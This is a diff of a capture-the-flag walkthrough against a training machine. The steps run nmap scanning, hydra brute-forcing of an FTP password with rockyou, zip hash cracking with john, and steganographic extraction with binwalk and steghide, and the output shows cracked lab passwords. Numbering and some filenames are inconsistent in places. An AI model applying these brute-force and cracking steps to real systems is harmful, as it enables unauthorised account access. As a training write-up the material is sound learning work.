@@ -12,10 +12,12 @@ This writeup was last updated: 7/01/2023
 2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
 3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
 ```bash
-root@ip-10-10-235-180:~# nmap -sC -sV 10.10.226.141 > PortScan.txt
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV 10.10.226.141 > PortScan.txt
 ```
 ```bash
-root@ip-10-10-235-180:~# cat PortScan.txt 
+┌──(kali㉿kali)-[~]
+└─$ cat PortScan.txt 
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-01 04:00 BST
 Nmap scan report for ip-10-10-226-141.eu-west-1.compute.internal (10.10.226.141)
@@ -42,7 +44,8 @@ Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
 > Inspecting the Web Pages
 4. `curl http://{TARGET IP}`
 ```bash
-root@ip-10-10-235-180:~# curl http://10.10.226.141
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.10.226.141
 
 <!DocType html>
 <html>
@@ -95,7 +98,8 @@ root@ip-10-10-235-180:~# curl http://10.10.226.141
 > Password Guessing Using Hydra
 12. `hydra -l {USER AGENT'S NAME} -P {WORDLIST PATH} ftp://{TARGET IP}`
 ```bash
-root@ip-10-10-4-181:~# hydra -l chris -P ~/Tools/wordlists/rockyou.txt ftp://10.10.55.185
+┌──(kali㉿kali)-[~]
+└─$ hydra -l chris -P ~/Tools/wordlists/rockyou.txt ftp://10.10.55.185
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 14:01:53
@@ -110,7 +114,8 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 14:02:54
 > Scanning the Target's FTP Server
 13. `ftp {TARGET IP}`
 ```bash
-root@ip-10-10-4-181:~# ftp 10.10.55.185
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.10.55.185
 Connected to 10.10.55.185.
 220 (vsFTPd 3.0.3)
 Name (10.10.55.185:root): chris
@@ -173,7 +178,8 @@ ftp> exit
 ```
 19. cat {FILE1}
 ```bash
-root@ip-10-10-4-181:~# cat To_agentJ.txt
+┌──(kali㉿kali)-[~]
+└─$ cat To_agentJ.txt
 Dear agent J,
 
 All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
@@ -181,17 +187,30 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 From,
 Agent C
 ```
+21. `steghide --info {FILE1}`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ steghide --info cute-alien.jpg
+"cute-alien.jpg":
+  format: jpeg
+  capacity: 1.8 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+steghide: could not extract any data with that passphrase!
+```
 20. `binwalk {FILE2}`
 21. `binwalk {FILE3}`
 ```bash
-root@ip-10-10-4-181:~# binwalk cute-alien.jpg
+┌──(kali㉿kali)-[~]
+└─$ binwalk cute-alien.jpg
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
 0             0x0             JPEG image data, JFIF standard 1.01
 ```
 ```bash
-root@ip-10-10-4-181:~# binwalk cutie.png
+┌──(kali㉿kali)-[~]
+└─$ binwalk cutie.png
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -203,7 +222,8 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 22. `binwalk {FILE3} --extract`
 23. `ls`
 ```bash
-root@ip-10-10-4-181:~# binwalk cutie.png --extract
+┌──(kali㉿kali)-[~]
+└─$ binwalk cutie.png --extract
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -211,34 +231,160 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 869           0x365           Zlib compressed data, best compression
 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820         0x8804          End of Zip archive
-
-root@ip-10-10-4-181:~# ls
- cute-alien.jpg
- cutie.png
- Desktop
- Instructions
- PortScan.txt
- Rooms
- thinclient_drives
- Tools
- cutie-alien.jpg
- _cutie.png.extracted
- Downloads
- Pictures
- Postman
- Scripts
- To_agentJ.txt
- work
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ls
+cute-alien.jpg
+cutie.png
+cutie-alien.jpg
+_cutie.png.extracted
+To_agentJ.txt
 ```
 24. `cd {EXTRACTED DIRECTORY}`
 25. `ls`
 ```bash
-root@ip-10-10-4-181:~# cd _cutie.png.extracted/
-root@ip-10-10-4-181:~/_cutie.png.extracted# ls
- 365
- 365.zlib
- 8702.zip
- To_agentR.txt
+┌──(kali㉿kali)-[~]
+└─$ cd _cutie.png.extracted/
+```
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ ls
+365
+365.zlib
+8702.zip
+To_agentJtxt
+```
+26. `zip2john {ZIP FILE} > {FILENAME2}.txt`
+27. `cat {FILENAME2}.txt`
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ zip2john 8702.zip > Hash.txt
+```
+```bash    
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ john Hash.txt                 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+alien            (8702.zip/To_agentR.txt)     
+1g 0:00:00:02 DONE 2/3 (2023-07-01 12:34) 0.4784g/s 21265p/s 21265c/s 21265C/s 123456..Peter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+28. `7z e 8702.Ip`
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ 7z e 8702.zip 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+Enter password (will not be echoed):
+Everything is Ok    
+
+Size:       86
+Compressed: 280
+```
+29. `ls`
+30. `cat {FILE?}.txt`
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ ls
+365  365.zlib  8702.zip  Hash.txt  To_agentJ.txt  To_agentR.txt
+```
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ cat To_agentR.txt
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+```
+32. `echo '{STRING}' > {FILENAME3}.txt`
+33. `hashid {FILENAME3}.txt`
+34. `base64 {FILENAME3}.txt --decode`
+35. `cd ..`
+32. `steghide --info {FILE1}`
+33. `steghide --extract -sf {FILE1}`
+34. `ls`
+35. `cat {TEXT FILE}`
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ echo 'QXJlYTUx' > String.txt
+```
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ hashid String.txt                                              
+--File 'Hash2.txt'--
+Analyzing 'QXJlYTUx'
+[+] Dahua 
+--End of file 'String.txt'--
+```
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ base64 String.txt --decode
+Area51
+```
+```bash
+┌──(kali㉿kali)-[~/_cutie.png.extracted]
+└─$ cd .. 
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ steghide --info cute-alien.jpg 
+"cute-alien.jpg":
+  format: jpeg
+  capacity: 1.8 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "message.txt":
+    size: 181.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ steghide --extract -sf cute-alien.jpg 
+Enter passphrase: 
+wrote extracted data to "message.txt".
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ ls
+cute-alien.jpg
+cutie.png
+cutie-alien.jpg
+_cutie.png.extracted
+message.txt
+To_agentJ.txt
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat message.txt                         
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
 ```
 
 # Vulnerability Identification
